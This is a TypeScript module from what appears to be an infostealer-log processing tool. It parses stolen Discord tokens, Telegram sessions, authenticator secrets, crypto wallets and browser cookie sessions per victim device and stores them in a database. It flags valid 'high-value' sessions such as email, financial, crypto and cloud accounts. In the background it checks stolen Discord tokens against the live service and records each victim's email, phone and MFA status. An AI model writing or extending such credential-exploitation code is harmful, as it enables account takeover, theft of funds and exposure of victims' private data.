/**
 * Parse Messaging & Wallet Data Integration
 *
 * Integrates Discord, Telegram, 2FA, and Crypto Wallet parsers into the processing pipeline
 */

import path from "path"
import { parseAllDiscordTokens } from "./stealer-parsers/discord-parser"
import { parseAllTelegramSessions } from "./stealer-parsers/telegram-parser"
import { parseAllAuthenticatorData } from "./stealer-parsers/authenticator-parser"
import { parseAllCryptoWallets } from "./stealer-parsers/wallet-parser"
import { parseAllCookieSessions } from "./stealer-parsers/cookie-session-analyzer"
import {
  insertDiscordTokens,
  insertTelegramSessions,
  insertAuthenticatorData,
  insertCryptoWallets,
  getDiscordTokensByDevice,
  updateDiscordTokenValidation,
} from "./db-messaging-helpers"
import { insertCookieSessions } from "./db-cookie-helpers"
import { validateDiscordTokensBatch } from "./discord-validator"

/**
 * Parse and store all messaging & wallet data for a device
 */
export async function parseAndStoreMessagingWalletData(
  deviceId: string,
  extractionDir: string,
  progressCallback?: (progress: number, message: string) => Promise<void>,
): Promise<{
  discord_tokens: number
  telegram_sessions: number
  authenticator_data: number
  crypto_wallets: number
  cookie_sessions: number
}> {
  const counts = {
    discord_tokens: 0,
    telegram_sessions: 0,
    authenticator_data: 0,
    crypto_wallets: 0,
    cookie_sessions: 0,
  }

  try {
    // Parse Discord tokens
    if (progressCallback) {
      await progressCallback(0, "🎮 Parsing Discord tokens...")
    }

    const discordTokens = parseAllDiscordTokens(extractionDir)
    if (discordTokens.length > 0) {
      counts.discord_tokens = await insertDiscordTokens(deviceId, discordTokens)
      console.log(`✅ Found ${counts.discord_tokens} Discord token(s)`)

      // Automatically validate Discord tokens in background (non-blocking)
      if (counts.discord_tokens > 0) {
        validateDiscordTokensInBackground(deviceId).catch((error) => {
          console.error("⚠️  Background Discord validation failed:", error)
          // Don't throw - validation failure shouldn't stop the main flow
        })
      }
    }

    // Parse Telegram sessions
    if (progressCallback) {
      await progressCallback(25, "📱 Parsing Telegram sessions...")
    }

    const telegramSessions = parseAllTelegramSessions(extractionDir)
    if (telegramSessions.length > 0) {
      counts.telegram_sessions = await insertTelegramSessions(deviceId, telegramSessions)
      console.log(`✅ Found ${counts.telegram_sessions} Telegram session(s)`)
    }

    // Parse 2FA/Authenticator data
    if (progressCallback) {
      await progressCallback(50, "🔐 Parsing 2FA/Authenticator data...")
    }

    const authData = parseAllAuthenticatorData(extractionDir)
    if (authData.length > 0) {
      counts.authenticator_data = await insertAuthenticatorData(deviceId, authData)
      console.log(`✅ Found ${counts.authenticator_data} 2FA/Authenticator entry(ies)`)
    }

    // Parse crypto wallets
    if (progressCallback) {
      await progressCallback(75, "💰 Parsing crypto wallets...")
    }

    const wallets = parseAllCryptoWallets(extractionDir)
    if (wallets.length > 0) {
      counts.crypto_wallets = await insertCryptoWallets(deviceId, wallets)
      console.log(`✅ Found ${counts.crypto_wallets} crypto wallet(s)`)
    }

    // Parse cookie sessions
    if (progressCallback) {
      await progressCallback(85, "🍪 Analyzing cookie sessions...")
    }

    const cookieSessions = parseAllCookieSessions(extractionDir)
    if (cookieSessions.length > 0) {
      counts.cookie_sessions = await insertCookieSessions(deviceId, cookieSessions)
      console.log(`✅ Found ${counts.cookie_sessions} authenticated session(s)`)

      // Log high-value sessions
      const highValue = cookieSessions.filter(
        (s) =>
          s.session_valid &&
          ["email", "financial", "crypto", "cloud", "development"].includes(
            s.service_category,
          ),
      )
      if (highValue.length > 0) {
        console.log(
          `🔥 Found ${highValue.length} high-value session(s): ${highValue.map((s) => s.service).join(", ")}`,
        )
      }
    }

    if (progressCallback) {
      await progressCallback(100, "✅ Messaging & wallet parsing complete")
    }

    return counts
  } catch (error) {
    console.error("❌ Error parsing messaging/wallet data:", error)
    return counts
  }
}

/**
 * Validate Discord tokens in the background (non-blocking)
 * This runs after tokens are inserted to automatically check their validity
 */
async function validateDiscordTokensInBackground(deviceId: string): Promise<void> {
  try {
    // Get all Discord tokens for this device
    const tokens = await getDiscordTokensByDevice(deviceId)

    if (tokens.length === 0) {
      return
    }

    console.log(`🔍 Starting background validation for ${tokens.length} Discord token(s)...`)

    // Extract token strings
    const tokenStrings = tokens.map((t) => t.token)

    // Validate tokens with 2-second delay between each to avoid rate limiting
    const results = await validateDiscordTokensBatch(tokenStrings, 2000)

    // Update database with validation results
    let validCount = 0
    let invalidCount = 0

    for (const [token, result] of results.entries()) {
      await updateDiscordTokenValidation(deviceId, token, {
        is_valid: result.is_valid,
        username: result.user_info?.username,
        discriminator: result.user_info?.discriminator,
        global_name: result.user_info?.global_name,
        avatar: result.user_info?.avatar,
        email: result.user_info?.email,
        phone: result.user_info?.phone,
        email_verified: result.user_info?.verified,
        phone_verified: result.user_info?.phone ? true : false,
        mfa_enabled: result.user_info?.mfa_enabled,
        premium_type: result.user_info?.premium_type,
        account_flags: result.user_info?.flags,
        server_count: result.server_count,
        friend_count: result.friend_count,
        account_created: result.account_created_timestamp,
        bio: result.user_info?.bio,
        validation_error: result.error_message,
      })

      if (result.is_valid) {
        validCount++
      } else {
        invalidCount++
      }
    }

    console.log(
      `✅ Discord validation complete: ${validCount} valid, ${invalidCount} invalid`,
    )
  } catch (error) {
    console.error("❌ Error in background Discord validation:", error)
    throw error
  }
}
